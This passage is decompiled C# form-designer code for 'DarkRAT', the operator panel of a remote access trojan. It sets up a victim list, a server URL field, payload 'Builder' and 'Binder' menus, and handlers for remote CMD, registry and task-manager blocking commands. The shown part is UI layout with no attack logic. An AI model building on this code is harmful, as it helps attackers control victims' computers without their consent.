      ToolStripMenuItem toolStripMenuItem93 = this.BuilderToolStripMenuItem;
      size1 = new Size(152, 22);
      Size size126 = size1;
      toolStripMenuItem93.Size = size126;
      this.BuilderToolStripMenuItem.Text = "Builder";
      this.ExtraToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.BinderToolStripMenuItem
      });
      this.ExtraToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ExtraToolStripMenuItem.Image");
      this.ExtraToolStripMenuItem.Name = "ExtraToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem94 = this.ExtraToolStripMenuItem;
      size1 = new Size(152, 22);
      Size size127 = size1;
      toolStripMenuItem94.Size = size127;
      this.ExtraToolStripMenuItem.Text = "Extra";
      this.BinderToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("BinderToolStripMenuItem.Image");
      this.BinderToolStripMenuItem.Name = "BinderToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem95 = this.BinderToolStripMenuItem;
      size1 = new Size(108, 22);
      Size size128 = size1;
      toolStripMenuItem95.Size = size128;
      this.BinderToolStripMenuItem.Text = "Binder";
      this.SettingsToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SettingsToolStripMenuItem.Image");
      this.SettingsToolStripMenuItem.Name = "SettingsToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem96 = this.SettingsToolStripMenuItem;
      size1 = new Size(152, 22);
      Size size129 = size1;
      toolStripMenuItem96.Size = size129;
      this.SettingsToolStripMenuItem.Text = "Settings";
      this.ExitToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ExitToolStripMenuItem.Image");
      this.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem97 = this.ExitToolStripMenuItem;
      size1 = new Size(152, 22);
      Size size130 = size1;
      toolStripMenuItem97.Size = size130;
      this.ExitToolStripMenuItem.Text = "Exit";
      this.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem98 = this.UpdateToolStripMenuItem;
      size1 = new Size(57, 20);
      Size size131 = size1;
      toolStripMenuItem98.Size = size131;
      this.UpdateToolStripMenuItem.Text = "Update";
      this.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem99 = this.AboutToolStripMenuItem;
      size1 = new Size(52, 20);
      Size size132 = size1;
      toolStripMenuItem99.Size = size132;
      this.AboutToolStripMenuItem.Text = "About";
      this.icon.Icon = (Icon) componentResourceManager.GetObject("icon.Icon");
      this.icon.Visible = true;
      this.notify.Items.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.ToolStripStatusLabel1,
        (ToolStripItem) this.ToolStripStatusLabel3,
        (ToolStripItem) this.ToolStripStatusLabel2
      });
      StatusStrip notify1 = this.notify;
      point1 = new Point(0, 447);
      Point point3 = point1;
      notify1.Location = point3;
      this.notify.Name = "notify";
      StatusStrip notify2 = this.notify;
      size1 = new Size(787, 22);
      Size size133 = size1;
      notify2.Size = size133;
      this.notify.TabIndex = 16;
      this.notify.Text = "StatusStrip1";
      this.ToolStripStatusLabel1.Image = (Image) componentResourceManager.GetObject("ToolStripStatusLabel1.Image");
      this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
      ToolStripStatusLabel stripStatusLabel1 = this.ToolStripStatusLabel1;
      size1 = new Size(145, 17);
      Size size134 = size1;
      stripStatusLabel1.Size = size134;
      this.ToolStripStatusLabel1.Text = "Status : Not Connected";
      this.ToolStripStatusLabel3.Image = (Image) componentResourceManager.GetObject("ToolStripStatusLabel3.Image");
      this.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3";
      ToolStripStatusLabel stripStatusLabel3 = this.ToolStripStatusLabel3;
      size1 = new Size(73, 17);
      Size size135 = size1;
      stripStatusLabel3.Size = size135;
      this.ToolStripStatusLabel3.Text = "Online : 0";
      this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
      ToolStripStatusLabel stripStatusLabel2 = this.ToolStripStatusLabel2;
      size1 = new Size(405, 17);
      Size size136 = size1;
      stripStatusLabel2.Size = size136;
      this.ToolStripStatusLabel2.Text = "                                                                                                                                   -";
      this.Label4.AutoSize = true;
      Label label4_1 = this.Label4;
      point1 = new Point(667, 322);
      Point point4 = point1;
      label4_1.Location = point4;
      this.Label4.Name = "Label4";
      Label label4_2 = this.Label4;
      size1 = new Size(43, 13);
      Size size137 = size1;
      label4_2.Size = size137;
      this.Label4.TabIndex = 20;
      this.Label4.Text = "Country";
      this.Label4.Visible = false;
      this.Label3.AutoSize = true;
      Label label3_1 = this.Label3;
      point1 = new Point(667, 300);
      Point point5 = point1;
      label3_1.Location = point5;
      this.Label3.Name = "Label3";
      Label label3_2 = this.Label3;
      size1 = new Size(17, 13);
      Size size138 = size1;
      label3_2.Size = size138;
      this.Label3.TabIndex = 19;
      this.Label3.Text = "IP";
      this.Label3.Visible = false;
      this.Label2.AutoSize = true;
      Label label2_1 = this.Label2;
      point1 = new Point(667, 278);
      Point point6 = point1;
      label2_1.Location = point6;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(26, 13);
      Size size139 = size1;
      label2_2.Size = size139;
      this.Label2.TabIndex = 18;
      this.Label2.Text = "Win";
      this.Label2.Visible = false;
      TextBox textBox1_1 = this.TextBox1;
      point1 = new Point(12, 37);
      Point point7 = point1;
      textBox1_1.Location = point7;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      size1 = new Size(632, 20);
      Size size140 = size1;
      textBox1_2.Size = size140;
      this.TextBox1.TabIndex = 13;
      this.TextBox1.Text = "http://127.0.0.1/rat/";
      this.Button1.Image = (Image) componentResourceManager.GetObject("Button1.Image");
      this.Button1.ImageAlign = ContentAlignment.BottomLeft;
      Button button1_1 = this.Button1;
      point1 = new Point(650, 36);
      Point point8 = point1;
      button1_1.Location = point8;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(84, 23);
      Size size141 = size1;
      button1_2.Size = size141;
      this.Button1.TabIndex = 12;
      this.Button1.Text = "CONNECT";
      this.Button1.TextAlign = ContentAlignment.MiddleRight;
      this.Button1.UseVisualStyleBackColor = true;
      this.Button2.Image = (Image) componentResourceManager.GetObject("Button2.Image");
      Button button2_1 = this.Button2;
      point1 = new Point(740, 36);
      Point point9 = point1;
      button2_1.Location = point9;
      this.Button2.Name = "Button2";
      Button button2_2 = this.Button2;
      size1 = new Size(32, 23);
      Size size142 = size1;
      button2_2.Size = size142;
      this.Button2.TabIndex = 14;
      this.Button2.TextAlign = ContentAlignment.MiddleRight;
      this.Button2.UseVisualStyleBackColor = true;
      this.Label1.AutoSize = true;
      Label label1_1 = this.Label1;
      point1 = new Point(664, 265);
      Point point10 = point1;
      label1_1.Location = point10;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(29, 13);
      Size size143 = size1;
      label1_2.Size = size143;
      this.Label1.TabIndex = 17;
      this.Label1.Text = "User";
      this.Label1.Visible = false;
      this.ListView1.BackColor = Color.Black;
      this.ListView1.Columns.AddRange(new ColumnHeader[6]
      {
        this.ColumnHeader1,
        this.ColumnHeader2,
        this.ColumnHeader3,
        this.ColumnHeader4,
        this.ColumnHeader5,
        this.ColumnHeader6
      });
      this.ListView1.ContextMenuStrip = this.menu;
      this.ListView1.ForeColor = Color.White;
      ListView listView1_1 = this.ListView1;
      point1 = new Point(12, 65);
      Point point11 = point1;
      listView1_1.Location = point11;
      this.ListView1.Name = "ListView1";
      ListView listView1_2 = this.ListView1;
      size1 = new Size(760, 371);
      Size size144 = size1;
      listView1_2.Size = size144;
      this.ListView1.TabIndex = 15;
      this.ListView1.UseCompatibleStateImageBehavior = false;
      this.ListView1.View = View.Details;
      this.ColumnHeader1.Text = "PC";
      this.ColumnHeader1.Width = 119;
      this.ColumnHeader2.Text = "Win";
      this.ColumnHeader2.Width = 149;
      this.ColumnHeader3.Text = "IP";
      this.ColumnHeader3.Width = 142;
      this.ColumnHeader4.Text = "Country";
      this.ColumnHeader4.Width = 144;
      this.ColumnHeader5.Text = "CPU";
      this.ColumnHeader5.Width = 171;
      this.ColumnHeader6.Text = "RAM";
      this.ColumnHeader6.Width = 123;
      this.countryflag.ImageStream = (ImageListStreamer) componentResourceManager.GetObject("countryflag.ImageStream");
      this.countryflag.TransparentColor = Color.Transparent;
      this.countryflag.Images.SetKeyName(0, "Afghanistan.png");
      this.countryflag.Images.SetKeyName(1, "Albania.png");
      this.countryflag.Images.SetKeyName(2, "Algeria.png");
      this.countryflag.Images.SetKeyName(3, "American Samoa.png");
      this.countryflag.Images.SetKeyName(4, "Andorra.png");
      this.countryflag.Images.SetKeyName(5, "Angola.png");
      this.countryflag.Images.SetKeyName(6, "Anguilla.png");
      this.countryflag.Images.SetKeyName(7, "Antigua and Barbuda.png");
      this.countryflag.Images.SetKeyName(8, "Argentina.png");
      this.countryflag.Images.SetKeyName(9, "Armenia.png");
      this.countryflag.Images.SetKeyName(10, "Aruba.png");
      this.countryflag.Images.SetKeyName(11, "Australia.png");
      this.countryflag.Images.SetKeyName(12, "Austria.png");
      this.countryflag.Images.SetKeyName(13, "Azerbaijan.png");
      this.countryflag.Images.SetKeyName(14, "Bahamas.png");
      this.countryflag.Images.SetKeyName(15, "Bahrain.png");
      this.countryflag.Images.SetKeyName(16, "Bangladesh.png");
      this.countryflag.Images.SetKeyName(17, "Barbados.png");
      this.countryflag.Images.SetKeyName(18, "Belarus.png");
      this.countryflag.Images.SetKeyName(19, "Belgium.png");
      this.countryflag.Images.SetKeyName(20, "Belize.png");
      this.countryflag.Images.SetKeyName(21, "Benin.png");
      this.countryflag.Images.SetKeyName(22, "Bermuda.png");
      this.countryflag.Images.SetKeyName(23, "Bhutan.png");
      this.countryflag.Images.SetKeyName(24, "Bolivia.png");
      this.countryflag.Images.SetKeyName(25, "Bosnia.png");
      this.countryflag.Images.SetKeyName(26, "Botswana.png");
      this.countryflag.Images.SetKeyName(27, "Brazil.png");
      this.countryflag.Images.SetKeyName(28, "British Virgin Islands.png");
      this.countryflag.Images.SetKeyName(29, "Brunei.png");
      this.countryflag.Images.SetKeyName(30, "Bulgaria.png");
      this.countryflag.Images.SetKeyName(31, "Burkina Faso.png");
      this.countryflag.Images.SetKeyName(32, "Burundi.png");
      this.countryflag.Images.SetKeyName(33, "Cambodia.png");
      this.countryflag.Images.SetKeyName(34, "Cameroon.png");
      this.countryflag.Images.SetKeyName(35, "Canada.png");
      this.countryflag.Images.SetKeyName(36, "Cape Verde.png");
      this.countryflag.Images.SetKeyName(37, "Cayman Islands.png");
      this.countryflag.Images.SetKeyName(38, "Central African Republic.png");
      this.countryflag.Images.SetKeyName(39, "Chad.png");
      this.countryflag.Images.SetKeyName(40, "Chile.png");
      this.countryflag.Images.SetKeyName(41, "China.png");
      this.countryflag.Images.SetKeyName(42, "Christmas Island.png");
      this.countryflag.Images.SetKeyName(43, "Colombia.png");
      this.countryflag.Images.SetKeyName(44, "Comoros.png");
      this.countryflag.Images.SetKeyName(45, "Cook Islands.png");
      this.countryflag.Images.SetKeyName(46, "Costa Rica.png");
      this.countryflag.Images.SetKeyName(47, "Côte d'Ivoire.png");
      this.countryflag.Images.SetKeyName(48, "Croatia.png");
      this.countryflag.Images.SetKeyName(49, "Cuba.png");
      this.countryflag.Images.SetKeyName(50, "Cyprus Northern.png");
      this.countryflag.Images.SetKeyName(51, "Cyprus.png");
      this.countryflag.Images.SetKeyName(52, "Czech Republic.png");
      this.countryflag.Images.SetKeyName(53, "Democratic Republic of the C ngo.png");
      this.countryflag.Images.SetKeyName(54, "Denmark.png");
      this.countryflag.Images.SetKeyName(55, "Djibouti.png");
      this.countryflag.Images.SetKeyName(56, "Dominica.png");
      this.countryflag.Images.SetKeyName(57, "Dominican_Republic.png");
      this.countryflag.Images.SetKeyName(58, "Ecuador.png");
      this.countryflag.Images.SetKeyName(59, "Egypt.png");
      this.countryflag.Images.SetKeyName(60, "El Salvador.png");
      this.countryflag.Images.SetKeyName(61, "Equatorial Guinea.png");
      this.countryflag.Images.SetKeyName(62, "Eritrea.png");
      this.countryflag.Images.SetKeyName(63, "Estonia.png");
      this.countryflag.Images.SetKeyName(64, "Ethiopia.png");
      this.countryflag.Images.SetKeyName(65, "Falkland Islands.png");
      this.countryflag.Images.SetKeyName(66, "Faroe Islands.png");
      this.countryflag.Images.SetKeyName(67, "Fiji.png");
      this.countryflag.Images.SetKeyName(68, "Finland.png");
      this.countryflag.Images.SetKeyName(69, "France.png");
      this.countryflag.Images.SetKeyName(70, "French Polynesia.png");
      this.countryflag.Images.SetKeyName(71, "Gabon.png");
      this.countryflag.Images.SetKeyName(72, "Gambia.png");
      this.countryflag.Images.SetKeyName(73, "Georgia.png");
      this.countryflag.Images.SetKeyName(74, "Germany.png");
      this.countryflag.Images.SetKeyName(75, "Ghana.png");
      this.countryflag.Images.SetKeyName(76, "Gibraltar.png");
      this.countryflag.Images.SetKeyName(77, "Greece.png");
      this.countryflag.Images.SetKeyName(78, "Greenland.png");
      this.countryflag.Images.SetKeyName(79, "Grenada.png");
      this.countryflag.Images.SetKeyName(80, "Guam.png");
      this.countryflag.Images.SetKeyName(81, "Guatemala.png");
      this.countryflag.Images.SetKeyName(82, "Guinea Bissau.png");
      this.countryflag.Images.SetKeyName(83, "Guinea.png");
      this.countryflag.Images.SetKeyName(84, "Guyana.png");
      this.countryflag.Images.SetKeyName(85, "Haiti.png");
      this.countryflag.Images.SetKeyName(86, "Honduras.png");
      this.countryflag.Images.SetKeyName(87, "Hong Kong.png");
      this.countryflag.Images.SetKeyName(88, "Hungary.png");
      this.countryflag.Images.SetKeyName(89, "Iceland.png");
      this.countryflag.Images.SetKeyName(90, "India.png");
      this.countryflag.Images.SetKeyName(91, "Indonesia.png");
      this.countryflag.Images.SetKeyName(92, "Iran.png");
      this.countryflag.Images.SetKeyName(93, "Iraq.png");
      this.countryflag.Images.SetKeyName(94, "Ireland.png");
      this.countryflag.Images.SetKeyName(95, "Israel.png");
      this.countryflag.Images.SetKeyName(96, "Italy.png");
      this.countryflag.Images.SetKeyName(97, "Jamaica.png");
      this.countryflag.Images.SetKeyName(98, "Japan.png");
      this.countryflag.Images.SetKeyName(99, "Jordan.png");
      this.countryflag.Images.SetKeyName(100, "Kazakhstan.png");
      this.countryflag.Images.SetKeyName(101, "Kenya.png");
      this.countryflag.Images.SetKeyName(102, "Kiribati.png");
      this.countryflag.Images.SetKeyName(103, "Kuwait.png");
      this.countryflag.Images.SetKeyName(104, "Kyrgyzstan.png");
      this.countryflag.Images.SetKeyName(105, "Laos.png");
      this.countryflag.Images.SetKeyName(106, "Latvia.png");
      this.countryflag.Images.SetKeyName(107, "Lebanon.png");
      this.countryflag.Images.SetKeyName(108, "Lesotho.png");
      this.countryflag.Images.SetKeyName(109, "Liberia.png");
      this.countryflag.Images.SetKeyName(110, "Libya.png");
      this.countryflag.Images.SetKeyName(111, "Liechtenstein.png");
      this.countryflag.Images.SetKeyName(112, "Lithuania.png");
      this.countryflag.Images.SetKeyName(113, "Luxembourg.png");
      this.countryflag.Images.SetKeyName(114, "Macao.png");
      this.countryflag.Images.SetKeyName(115, "Macedonia.png");
      this.countryflag.Images.SetKeyName(116, "Madagascar.png");
      this.countryflag.Images.SetKeyName(117, "Malawi.png");
      this.countryflag.Images.SetKeyName(118, "Malaysia.png");
      this.countryflag.Images.SetKeyName(119, "Maldives.png");
      this.countryflag.Images.SetKeyName(120, "Mali.png");
      this.countryflag.Images.SetKeyName(121, "Malta.png");
      this.countryflag.Images.SetKeyName(122, "Marshall Islands.png");
      this.countryflag.Images.SetKeyName(123, "Martinique.png");
      this.countryflag.Images.SetKeyName(124, "Mauritania.png");
      this.countryflag.Images.SetKeyName(125, "Mauritius.png");
      this.countryflag.Images.SetKeyName(126, "Mexico.png");
      this.countryflag.Images.SetKeyName((int) sbyte.MaxValue, "Micronesia.png");
      this.countryflag.Images.SetKeyName(128, "Moldova.png");
      this.countryflag.Images.SetKeyName(129, "Monaco.png");
      this.countryflag.Images.SetKeyName(130, "Mongolia.png");
      this.countryflag.Images.SetKeyName(131, "Montserrat.png");
      this.countryflag.Images.SetKeyName(132, "Morocco.png");
      this.countryflag.Images.SetKeyName(133, "Mozambique.png");
      this.countryflag.Images.SetKeyName(134, "Myanmar.png");
      this.countryflag.Images.SetKeyName(135, "Namibia.png");
      this.countryflag.Images.SetKeyName(136, "Nauru.png");
      this.countryflag.Images.SetKeyName(137, "Nepal.png");
      this.countryflag.Images.SetKeyName(138, "Netherlands Antilles.png");
      this.countryflag.Images.SetKeyName(139, "Netherlands.png");
      this.countryflag.Images.SetKeyName(140, "New Zealand.png");
      this.countryflag.Images.SetKeyName(141, "Nicaragua.png");
      this.countryflag.Images.SetKeyName(142, "Niger.png");
      this.countryflag.Images.SetKeyName(143, "Nigeria.png");
      this.countryflag.Images.SetKeyName(144, "Niue.png");
      this.countryflag.Images.SetKeyName(145, "Norfolk Island.png");
      this.countryflag.Images.SetKeyName(146, "North Korea.png");
      this.countryflag.Images.SetKeyName(147, "Norway.png");
      this.countryflag.Images.SetKeyName(148, "Oman.png");
      this.countryflag.Images.SetKeyName(149, "Pakistan.png");
      this.countryflag.Images.SetKeyName(150, "Palau.png");
      this.countryflag.Images.SetKeyName(151, "Panama.png");
      this.countryflag.Images.SetKeyName(152, "Papua New Guinea.png");
      this.countryflag.Images.SetKeyName(153, "Paraguay.png");
      this.countryflag.Images.SetKeyName(154, "Peru.png");
      this.countryflag.Images.SetKeyName(155, "Philippines.png");
      this.countryflag.Images.SetKeyName(156, "Pitcairn Islands.png");
      this.countryflag.Images.SetKeyName(157, "Poland.png");
      this.countryflag.Images.SetKeyName(158, "Portugal.png");
      this.countryflag.Images.SetKeyName(159, "Puerto Rico.png");
      this.countryflag.Images.SetKeyName(160, "Qatar.png");
      this.countryflag.Images.SetKeyName(161, "Republic of the Congo.png");
      this.countryflag.Images.SetKeyName(162, "Romania.png");
      this.countryflag.Images.SetKeyName(163, "Russian Federation.png");
      this.countryflag.Images.SetKeyName(164, "Rwanda.png");
      this.countryflag.Images.SetKeyName(165, "Saint Kitts and Nevis.png");
      this.countryflag.Images.SetKeyName(166, "Saint Lucia.png");
      this.countryflag.Images.SetKeyName(167, "Saint Pierre.png");
      this.countryflag.Images.SetKeyName(168, "Saint Vicent and the Grenadines.png");
      this.countryflag.Images.SetKeyName(169, "Samoa.png");
      this.countryflag.Images.SetKeyName(170, "San Marino.png");
      this.countryflag.Images.SetKeyName(171, "Sao Tomé and Príncipe.png");
      this.countryflag.Images.SetKeyName(172, "Saudi Arabia.png");
      this.countryflag.Images.SetKeyName(173, "Senegal.png");
      this.countryflag.Images.SetKeyName(174, "Serbia and Montenegro.png");
      this.countryflag.Images.SetKeyName(175, "Seychelles.png");
      this.countryflag.Images.SetKeyName(176, "Sierra Leone.png");
      this.countryflag.Images.SetKeyName(177, "Singapore.png");
      this.countryflag.Images.SetKeyName(178, "Slovakia.png");
      this.countryflag.Images.SetKeyName(179, "Slovenia.png");
      this.countryflag.Images.SetKeyName(180, "Soloman Islands.png");
      this.countryflag.Images.SetKeyName(181, "Somalia.png");
      this.countryflag.Images.SetKeyName(182, "South Africa.png");
      this.countryflag.Images.SetKeyName(183, "South Georgia.png");
      this.countryflag.Images.SetKeyName(184, "South Korea.png");
      this.countryflag.Images.SetKeyName(185, "Soviet Union.png");
      this.countryflag.Images.SetKeyName(186, "Spain.png");
      this.countryflag.Images.SetKeyName(187, "Sri Lanka.png");
      this.countryflag.Images.SetKeyName(188, "Sudan.png");
      this.countryflag.Images.SetKeyName(189, "Suriname.png");
      this.countryflag.Images.SetKeyName(190, "Swaziland.png");
      this.countryflag.Images.SetKeyName(191, "Sweden.png");
      this.countryflag.Images.SetKeyName(192, "Switzerland.png");
      this.countryflag.Images.SetKeyName(193, "Syria.png");
      this.countryflag.Images.SetKeyName(194, "Taiwan.png");
      this.countryflag.Images.SetKeyName(195, "Tajikistan.png");
      this.countryflag.Images.SetKeyName(196, "Tanzania.png");
      this.countryflag.Images.SetKeyName(197, "Thailand.png");
      this.countryflag.Images.SetKeyName(198, "Tibet.png");
      this.countryflag.Images.SetKeyName(199, "Timor-Leste.png");
      this.countryflag.Images.SetKeyName(200, "Togo.png");
      this.countryflag.Images.SetKeyName(201, "Tonga.png");
      this.countryflag.Images.SetKeyName(202, "Trinidad_and_Tobago.png");
      this.countryflag.Images.SetKeyName(203, "Tunisia.png");
      this.countryflag.Images.SetKeyName(204, "Turkey.png");
      this.countryflag.Images.SetKeyName(205, "Turkmenistan.png");
      this.countryflag.Images.SetKeyName(206, "Turks_and_Caicos_Islands.png");
      this.countryflag.Images.SetKeyName(207, "Tuvalu.png");
      this.countryflag.Images.SetKeyName(208, "UAE.png");
      this.countryflag.Images.SetKeyName(209, "Uganda.png");
      this.countryflag.Images.SetKeyName(210, "Ukraine.png");
      this.countryflag.Images.SetKeyName(211, "United Kingdom.png");
      this.countryflag.Images.SetKeyName(212, "United States of America.png");
      this.countryflag.Images.SetKeyName(213, "Uruguay.png");
      this.countryflag.Images.SetKeyName(214, "US Virgin Islands.png");
      this.countryflag.Images.SetKeyName(215, "Uzbekistan.png");
      this.countryflag.Images.SetKeyName(216, "Vanuatu.png");
      this.countryflag.Images.SetKeyName(217, "Vatican City.png");
      this.countryflag.Images.SetKeyName(218, "Venezuela.png");
      this.countryflag.Images.SetKeyName(219, "Vietnam.png");
      this.countryflag.Images.SetKeyName(220, "Wallis and Futuna.png");
      this.countryflag.Images.SetKeyName(221, "Yemen.png");
      this.countryflag.Images.SetKeyName(222, "Zambia.png");
      this.countryflag.Images.SetKeyName(223, "Zimbabwe.png");
      this.Label5.AutoSize = true;
      Label label5_1 = this.Label5;
      point1 = new Point(667, 344);
      Point point12 = point1;
      label5_1.Location = point12;
      this.Label5.Name = "Label5";
      Label label5_2 = this.Label5;
      size1 = new Size(29, 13);
      Size size145 = size1;
      label5_2.Size = size145;
      this.Label5.TabIndex = 21;
      this.Label5.Text = "CPU";
      this.Label5.Visible = false;
      this.Label6.AutoSize = true;
      Label label6_1 = this.Label6;
      point1 = new Point(667, 366);
      Point point13 = point1;
      label6_1.Location = point13;
      this.Label6.Name = "Label6";
      Label label6_2 = this.Label6;
      size1 = new Size(31, 13);
      Size size146 = size1;
      label6_2.Size = size146;
      this.Label6.TabIndex = 22;
      this.Label6.Text = "RAM";
      this.Label6.Visible = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(787, 469);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.notify);
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.menubar);
      this.Controls.Add((Control) this.Label4);
      this.Controls.Add((Control) this.Label6);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.Label5);
      this.Controls.Add((Control) this.Button2);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.ListView1);
      this.FormBorderStyle = FormBorderStyle.FixedDialog;
      this.MainMenuStrip = this.menubar;
      this.MaximizeBox = false;
      this.Name = nameof (program);
      this.Text = "DarkRAT";
      this.menu.ResumeLayout(false);
      this.menubar.ResumeLayout(false);
      this.menubar.PerformLayout();
      this.notify.ResumeLayout(false);
      this.notify.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual ContextMenuStrip menu
    {
      [DebuggerNonUserCode] get => this._menu;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        CancelEventHandler cancelEventHandler = new CancelEventHandler(this.menu_Opening);
        if (this._menu != null)
          this._menu.Opening -= cancelEventHandler;
        this._menu = value;
        if (this._menu == null)
          return;
        this._menu.Opening += cancelEventHandler;
      }
    }

    internal virtual ToolStripMenuItem OpenCMDToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._OpenCMDToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OpenCMDToolStripMenuItem_Click);
        if (this._OpenCMDToolStripMenuItem != null)
          this._OpenCMDToolStripMenuItem.Click -= eventHandler;
        this._OpenCMDToolStripMenuItem = value;
        if (this._OpenCMDToolStripMenuItem == null)
          return;
        this._OpenCMDToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer checkusers
    {
      [DebuggerNonUserCode] get => this._checkusers;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._checkusers != null)
          this._checkusers.Tick -= eventHandler;
        this._checkusers = value;
        if (this._checkusers == null)
          return;
        this._checkusers.Tick += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DeleteFromListToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DeleteFromListToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteFromListToolStripMenuItem_Click);
        if (this._DeleteFromListToolStripMenuItem != null)
          this._DeleteFromListToolStripMenuItem.Click -= eventHandler;
        this._DeleteFromListToolStripMenuItem = value;
        if (this._DeleteFromListToolStripMenuItem == null)
          return;
        this._DeleteFromListToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RefreshToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RefreshToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem_Click);
        if (this._RefreshToolStripMenuItem != null)
          this._RefreshToolStripMenuItem.Click -= eventHandler;
        this._RefreshToolStripMenuItem = value;
        if (this._RefreshToolStripMenuItem == null)
          return;
        this._RefreshToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem OpenWebSiteToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._OpenWebSiteToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OpenWebSiteToolStripMenuItem_Click);
        if (this._OpenWebSiteToolStripMenuItem != null)
          this._OpenWebSiteToolStripMenuItem.Click -= eventHandler;
        this._OpenWebSiteToolStripMenuItem = value;
        if (this._OpenWebSiteToolStripMenuItem == null)
          return;
        this._OpenWebSiteToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RegistryToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RegistryToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._RegistryToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem BlockTaskManagerToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._BlockTaskManagerToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._BlockTaskManagerToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem EnableCMDToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._EnableCMDToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._EnableCMDToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem EnableToolStripMenuItem3
    {
      [DebuggerNonUserCode] get => this._EnableToolStripMenuItem3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.EnableToolStripMenuItem3_Click);
        if (this._EnableToolStripMenuItem3 != null)
          this._EnableToolStripMenuItem3.Click -= eventHandler;
        this._EnableToolStripMenuItem3 = value;
        if (this._EnableToolStripMenuItem3 == null)
          return;
        this._EnableToolStripMenuItem3.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DisableToolStripMenuItem3
    {
      [DebuggerNonUserCode] get => this._DisableToolStripMenuItem3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DisableToolStripMenuItem3_Click);
        if (this._DisableToolStripMenuItem3 != null)
          this._DisableToolStripMenuItem3.Click -= eventHandler;
        this._DisableToolStripMenuItem3 = value;
        if (this._DisableToolStripMenuItem3 == null)
          return;
        this._DisableToolStripMenuItem3.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem EnableToolStripMenuItem2
    {
      [DebuggerNonUserCode] get => this._EnableToolStripMenuItem2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.EnableToolStripMenuItem2_Click);
        if (this._EnableToolStripMenuItem2 != null)
          this._EnableToolStripMenuItem2.Click -= eventHandler;
        this._EnableToolStripMenuItem2 = value;
        if (this._EnableToolStripMenuItem2 == null)
          return;
        this._EnableToolStripMenuItem2.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DisableToolStripMenuItem2
    {
      [DebuggerNonUserCode] get => this._DisableToolStripMenuItem2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DisableToolStripMenuItem2_Click);
        if (this._DisableToolStripMenuItem2 != null)
          this._DisableToolStripMenuItem2.Click -= eventHandler;
        this._DisableToolStripMenuItem2 = value;
